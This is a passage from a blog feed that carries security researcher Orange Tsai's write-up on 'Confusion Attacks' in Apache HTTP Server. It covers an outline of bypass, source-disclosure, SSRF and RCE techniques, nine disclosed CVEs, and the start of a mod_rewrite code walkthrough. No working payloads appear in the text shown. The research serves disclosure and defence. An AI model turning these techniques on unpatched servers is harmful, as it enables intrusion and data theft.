&lt;p&gt;Á∂≠Ë≠∑‰∏ÄÂÄã Open Source Â∞àÊ°àÁúüÁöÑÊòØ‰∏Ä‰ª∂ÂæàÂõ∞Èõ£ÁöÑ‰∫ãÔºåÂ∞§ÂÖ∂Âú®ËÆì‰ΩøÁî®ËÄÖÊñπ‰æøÁöÑÂêåÊôÇÂÖºÈ°ßËàäÁâàÊú¨ÁöÑÁõ∏ÂÆπÊÄßÔºåÁ®çÊúâ‰∏çÊÖéÂèØËÉΩÂ∞±ÊúÉÈÄ†ÊàêÊï¥ÂÄãÁ≥ªÁµ±Ë¢´ÊîªÁ†¥ (‰æãÂ¶Ç Httpd 2.4.49 ‰∏≠Âõ†ÁÇ∫‰∏ÄÂÄãË∑ØÂæëËôïÁêÜÈÇèËºØÂ∞èÊîπÂãïÂ∞éËá¥ÁÅΩÈõ£ÊÄßÁöÑ &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773&quot;&gt;CVE-2021-41773&lt;/a&gt;)ÔºåÊï¥ÂÄãÈñãÁôºÈÅéÁ®ãÂøÖÈ†àË¶ÅÂ∞èÂøÉÁøºÁøºÁöÑË∏©Âú®‰∏ÄÂ†ÜÈÅ∫ÁïôÁ®ãÂºèÁ¢º‰ª•ÂèäÊäÄË°ìÂÇµ‰∏ä„ÄÇ ÊâÄ‰ª•Â¶ÇÊûúÁúüÁöÑÊúâ Apache HTTP Server ÁöÑÈñãÁôºËÄÖÁúãÂà∞ÈÄôÁØáÊñáÊàëÊÉ≥Ë™™Ôºö Ë¨ùË¨ù‰Ω†ÂÄëÁöÑË≤¢ÁçªÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/</link>
                <guid>https://devco.re/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server</guid>
                <pubDate>Fri, 09 Aug 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</title>
                <description>&lt;h6 id=&quot;orange-tsai-orange_8361--ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨--english-version&quot;&gt;Orange Tsai (&lt;a href=&quot;https://x.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) ¬†|¬† &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server/&quot;&gt;ÁπÅÈ´î‰∏≠ÊñáÁâàÊú¨&lt;/a&gt; ¬†|¬† &lt;a href=&quot;/blog/2024/08/09/confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-en/&quot;&gt;English Version&lt;/a&gt;&lt;/h6&gt;

&lt;style&gt;
    .language-plaintext {
        background-color: #f9f2f4;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;Hey there! This is my research on Apache HTTP Server presented at &lt;a href=&quot;https://www.blackhat.com/us-24/briefings/schedule/index.html#confusion-attacks-exploiting-hidden-semantic-ambiguity-in-apache-http-server-pre-recorded-40227&quot;&gt;Black Hat USA 2024&lt;/a&gt;. Additionally, this research will also be presented at &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/eff94e55-3f1d-4229-a65a-65ade9524421/&quot;&gt;HITCON&lt;/a&gt; and &lt;a href=&quot;https://orangecon.nl/&quot;&gt;OrangeCon&lt;/a&gt;. If you‚Äôre interested in getting a preview, you can check the slides here:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf&quot;&gt;Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Also, I would like to thank Akamai for their friendly outreach! They released mitigation measures immediately after this research was published (details can be found on &lt;a href=&quot;https://www.akamai.com/blog/security-research/2024-august-apache-waf-proactive-collaboration-orange-tsai-devcore&quot;&gt;Akamai‚Äôs blog&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;This article explores architectural issues within the Apache HTTP Server, highlighting several technical debts within Httpd, &lt;strong&gt;including 3 types of Confusion Attacks, 9 new vulnerabilities, 20 exploitation techniques, and over 30 case studies&lt;/strong&gt;. The content includes, but is not limited to:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;How a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; can bypass Httpd‚Äôs built-in access control and authentication.&lt;/li&gt;
  &lt;li&gt;How unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRules&lt;/code&gt; can escape the Web Root and access the entire filesystem.&lt;/li&gt;
  &lt;li&gt;How to leverage a piece of code from 1996 to transform an XSS into RCE.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#before-the-story&quot;&gt;Before the Story&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack ‚Äî Confusion Attack&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#-1-filename-confusion&quot;&gt;1. Filename Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-1-truncation&quot;&gt;Primitive 1-1. Truncation&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-1-path-truncation&quot;&gt;1-1-1. Path Truncation&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-1-1-2-mislead-rewriteflag-assignment&quot;&gt;1-1-2. Mislead RewriteFlag Assignment&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-1-2-acl-bypass&quot;&gt;Primitive 1-2. ACL Bypass&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-2-documentroot-confusion&quot;&gt;2. DocumentRoot Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-1-server-side-source-code-disclosure&quot;&gt;Primitive 2-1. Server-Side Source Code Disclosure&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-1-disclose-cgi-source-code&quot;&gt;2-1-1. Disclose CGI Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-1-2-disclose-php-source-code&quot;&gt;2-1-2. Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-2-local-gadgets-manipulation&quot;&gt;Primitive 2-2. Local Gadgets Manipulation!&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-1-local-gadget-to-information-disclosure&quot;&gt;2-2-1. Local Gadget to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-2-local-gadget-to-xss&quot;&gt;2-2-2. Local Gadget to XSS&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-3-local-gadget-to-lfi&quot;&gt;2-2-3. Local Gadget to LFI&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-4-local-gadget-to-ssrf&quot;&gt;2-2-4. Local Gadget to SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-2-5-local-gadget-to-rce&quot;&gt;2-2-5. Local Gadget to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-2-3-jailbreak-from-local-gadgets&quot;&gt;Primitive 2-3. Jailbreak from Local Gadgets&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-1-jailbreak-from-local-gadgets&quot;&gt;2-3-1. Jailbreak from Local Gadgets&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-2-3-2-jailbreak-local-gadgets-to-redmine-rce&quot;&gt;2-3-2. Jailbreak Local Gadgets to Redmine RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-3-handler-confusion&quot;&gt;3. Handler Confusion&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-1-overwrite-the-handler&quot;&gt;Primitive 3-1. Overwrite the Handler&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-1-2-overwrite-handler-to---&quot;&gt;3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-primitive-3-2-invoke-arbitrary-handlers&quot;&gt;Primitive 3-2. Invoke Arbitrary Handlers&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-1-arbitrary-handler-to-information-disclosure&quot;&gt;3-2-1. Arbitrary Handler to Information Disclosure&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-misinterpret-scripts&quot;&gt;3-2-2. Arbitrary Handler to Misinterpret Scripts&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-2-arbitrary-handler-to-full-ssrf&quot;&gt;3-2-2. Arbitrary Handler to Full SSRF&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-3-arbitrary-handler-to-access-local-unix-domain-socket&quot;&gt;3-2-3. Arbitrary Handler to Access Local Unix Domain Socket&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-3-2-4-arbitrary-handler-to-rce&quot;&gt;3-2-4. Arbitrary Handler to RCE&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#-4-other-vulnerabilities&quot;&gt;4. Other Vulnerabilities&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-38472---windows-unc-based-ssrf&quot;&gt;CVE-2024-38472 - Windows UNC-based SSRF&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-http-request-parser&quot;&gt;Triggered via HTTP Request Parser&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-triggered-via-type-map&quot;&gt;Triggered via Type-Map&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#%ef%b8%8f-cve-2024-39573---ssrf-via-full-control-of-rewriterule-prefix&quot;&gt;CVE-2024-39573 - SSRF via Full Control of RewriteRule Prefix&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#future-works&quot;&gt;Future Works&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;before-the-story&quot;&gt;Before the Story&lt;/h2&gt;

&lt;p&gt;This section is just some personal murmurs. If you‚Äôre only interested in the technical details, jump straight to ‚Äî &lt;a href=&quot;#how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As a researcher, perhaps the greatest joy is seeing your work recognized and understood by peers. Therefore, after completing a significant research with fruitful results, it is natural to want the world to see it ‚Äî which is why I‚Äôve presented multiple times at Black Hat USA and DEFCON. As you might know, since 2022, I have been unable to obtain a valid travel authorization to enter the U.S. (For Taiwan, travel authorization under the &lt;a href=&quot;https://esta.cbp.dhs.gov/&quot;&gt;Visa Waiver Program&lt;/a&gt; can typically be obtained online within minutes to hours), leading me to miss the in-person talk at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA 2022&lt;/a&gt;. Even a solo trip to Machu Picchu and Easter Island in 2023 couldn‚Äôt transit through the U.S. :(&lt;/p&gt;

&lt;p&gt;To address this situation, I started preparing for a B1/B2 visa in January this year, writing various documents, interviewing at the embassy, and endlessly waiting. It‚Äôs not fun. But to have my work seen, I still spent a lot of time seeking all possibilities, even until three weeks before the conference, it was unclear whether my talk would be canceled or not (BH only accepted in-person talks, but thanks to the RB, it could ultimately be presented in pre-recorded format). So, everything you see, including slides, videos, and this blog, was completed within just a few dozen days. üòñ&lt;/p&gt;

&lt;p&gt;As a pure researcher with a clear conscience, my attitude towards vulnerabilities has always been ‚Äî they should be directly reported to and fixed by the vendor. Writing these words isn‚Äôt for any particular reason, just to record some feelings of helplessness, efforts in this year, and to thank those who have helped me this year, thank you all :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-did-the-story-begin&quot;&gt;How Did the Story Begin?&lt;/h2&gt;

&lt;p&gt;Around the beginning of this year, I started thinking about my next research target. As you might know, I always aim to challenge big targets that can impact the entire internet, so I began searching for some complex topics or interesting open-source projects like Nginx, PHP, or even delved into RFCs to strengthen my understanding of protocol details.&lt;/p&gt;

&lt;p&gt;While most attempts ended in failure (though a few might become topics for next blog posts üòâ), reading these codes reminded me of a quick review I had done of Apache HTTP Server last year! Although I didn‚Äôt dive deep into the code due to the work schedule, I had already ‚Äúsmelled‚Äù something not quite right about its coding style at that time.&lt;/p&gt;

&lt;p&gt;So this year, I decided to continue on that research, transforming the ‚Äúbad smells‚Äù from an indescribable ‚Äúfeeling‚Äù into concrete research on Apache HTTP Server!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-apache-http-server-smells-bad&quot;&gt;Why Apache HTTP Server Smells Bad?&lt;/h2&gt;

&lt;p&gt;Firstly, the Apache HTTP Server is a world constructed by ‚Äúmodules,‚Äù as proudly declared in its &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mpm.html&quot;&gt;official documentation&lt;/a&gt; regarding its modularity:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Apache httpd has always accommodated a wide variety of environments through its modular design. [‚Ä¶] Apache HTTP Server 2.0 extends this modular design to the most basic functions of a web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The entire Httpd service relies on hundreds of small modules working together to handle a client‚Äôs HTTP request. &lt;strong&gt;Among the &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/&quot;&gt;136 modules listed by the official documentation&lt;/a&gt;, about half are either enabled by default or frequently used by websites&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;What‚Äôs even more surprising is that these modules also maintain a colossal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;request_rec&lt;/code&gt; structure while processing client HTTP requests. This structure includes all the elements involved in handling HTTP, with its detailed definition available in &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/include/httpd.h#L838&quot;&gt;include/httpd.h&lt;/a&gt;. All modules depend on this massive structure for synchronization, communication, and data exchange. As an HTTP request passes through several phases, modules act like players in a game of catch, passing the structure from one to another. Each module even has the ability to modify any value in this structure according to its own preferences!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This type of collaboration is not new from a software engineering perspective. Each module simply focuses on its own task. As long as everyone finishes their work, then the client can enjoy the service provided by Httpd. This approach might work well with a few modules, &lt;strong&gt;but what happens when we scale it up to hundreds of modules collaborating ‚Äî can they really work  well together?&lt;/strong&gt; ü§î&lt;/p&gt;

&lt;p&gt;Our starting point is straightforward ‚Äî &lt;strong&gt;the modules do not fully understand each other, yet they are required to cooperate&lt;/strong&gt;. Each module might be implemented by different people, with the code undergoing years of iterations, refactors, and modifications. Do they really still know what they are doing? Even if they understand their own duty, what about other modules‚Äô implementation details? Without any good development standards or guidelines, there must be several gaps that we can exploit!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;a-whole-new-attack--confusion-attack&quot;&gt;A Whole New Attack ‚Äî Confusion Attack&lt;/h2&gt;

&lt;p&gt;Based on these observations, we started &lt;strong&gt;focusing on the ‚Äúrelationships‚Äù and ‚Äúinteractions‚Äù among these modules&lt;/strong&gt;. If a module accidentally modifies a structure field that it considers unimportant, but is crucial for another module, it could affect the latter‚Äôs decisions. Furthermore, if the definitions or semantics of the fields are not precise enough, causing ambiguities in how modules understand the same fields, it could lead to potential security risks as well!&lt;/p&gt;

&lt;p&gt;From this starting point, we developed three different types of attacks, as these attacks are more or less related to the misuse of structure fields. Hence, we‚Äôve named this attack surface ‚ÄúConfusion Attack,‚Äù and the following are the attacks we developed:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Filename Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;DocumentRoot Confusion&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Handler Confusion&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Through these attacks, we have identified 9 different vulnerabilities:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38472&lt;/strong&gt; - Apache HTTP Server on Windows UNC SSRF&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-39573&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38477&lt;/strong&gt; - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38476&lt;/strong&gt; - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38475&lt;/strong&gt; - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38474&lt;/strong&gt; - Apache HTTP Server weakness with encoded question marks in backreferences&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-38473&lt;/strong&gt; - Apache HTTP Server proxy encoding problem&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2023-38709&lt;/strong&gt; - Apache HTTP Server: HTTP response splitting&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CVE-2024-??????&lt;/strong&gt; - [redacted]&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;These vulnerabilities were reported through the official security mailing list and were addressed by the Apache HTTP Server in the &lt;a href=&quot;https://httpd.apache.org/security/vulnerabilities_24.html&quot;&gt;2.4.60 update&lt;/a&gt; published on 2024-07-01.&lt;/p&gt;

&lt;p&gt;As this is a new attack surface from Httpd‚Äôs architectural design and its internal mechanisms, naturally, &lt;del&gt;the first person to delve into it can find the most vulnerabilities. Thus, I currently hold the most CVEs from Apache HTTP Server üòâ.&lt;/del&gt; it leads to many updates that are not backward compatible. Therefore, patching these issues is not easy for many long-running production servers. If administrators update without careful consideration, they might disrupt existing configurations, causing service downtime. üò®&lt;/p&gt;

&lt;p&gt;Now, it‚Äôs time to get started with our Confusion Attacks! Are you ready?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-1-filename-confusion&quot;&gt;üî• 1. Filename Confusion&lt;/h3&gt;

&lt;p&gt;The first issue stems from confusion regarding the filename field. Literally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; should represent a filesystem path. However, in Apache HTTP Server, some modules treat it as a URL. If, within an HTTP context, most modules consider &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path but some others treat it as a URL, this inconsistency can lead to security issues!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-1-1-truncation&quot;&gt;‚öîÔ∏è Primitive 1-1. Truncation&lt;/h4&gt;

&lt;p&gt;So, which modules treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL? The first is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt;, which allows sysadmins to easily rewrite a path pattern to a specified substitution target using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; directive:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; Pattern Substitution [flags]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The target can be either a filesystem path or a URL. This feature likely exists for user experience. However, this ‚Äúconvenience‚Äù also introduces risks. For instance, &lt;strong&gt;while rewriting the target paths, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcefully treats all results as a URL&lt;/strong&gt;, truncating the path after a question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%3F&lt;/code&gt;. This leads to the following two exploitations.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141&quot;&gt;modules/mappers/mod_rewrite.c#L4141&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
 * Apply a single RewriteRule
 */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apply_rewrite_rule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriterule_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewrite_ctx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ap_regmatch_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regmatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AP_MAX_REG_MATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;apr_array_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rewriteconds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nelts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rewritecond_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apply_rewrite_cond&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// [...] do the remaining stuff&lt;/span&gt;
        
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;cm&quot;&gt;/* Now adjust API&apos;s knowledge about r-&amp;gt;filename and r-&amp;gt;args */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newuri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

